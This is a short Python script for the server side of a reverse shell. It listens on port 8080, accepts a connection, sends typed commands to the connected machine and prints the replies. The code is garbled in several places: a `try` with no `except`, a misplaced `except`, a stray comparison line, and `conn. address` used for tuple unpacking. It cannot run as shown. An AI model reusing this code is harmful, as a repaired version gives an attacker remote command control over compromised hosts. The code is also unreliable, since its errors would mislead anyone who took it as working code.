#!/usr/bin/env python3
import socket
import sys

def create_socket():
	try:
		global host
		global port
		global s
		host = ""
		port = 8080
		s = socket.socket()

		socket.error  == msg ;
		#print ("socket creation error" + str (msg))

def  bind_socket():
	except:
		global host
		global port
		global s
		print ("Binding the Port" + str (msg))

		s.bind ((host, port))
		s.listen (5)

	except socket.error as msg:
		print ("socket Binding error" + str (msg) + "/n" "retrying...")
		bind_socket()

def socket_accept():
		conn. address =  s.accept()
		print ("connection has been esstablished! |" + "IP" + address [0] + " | Port" +str (address[1]))
		send_commands(conn)
		conn.close()


def send_commands (conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			s.close()
			sys.exit()
		if len (str.encode(cmd)) > 0:
			conn.send (str.encode (cmd))
			client_response = str (conn.recv (1024), "utf-8")
			print (client_response, end = "" )

def main ():
	create_socket()
	bind_socket()
	socket_accept()


main()
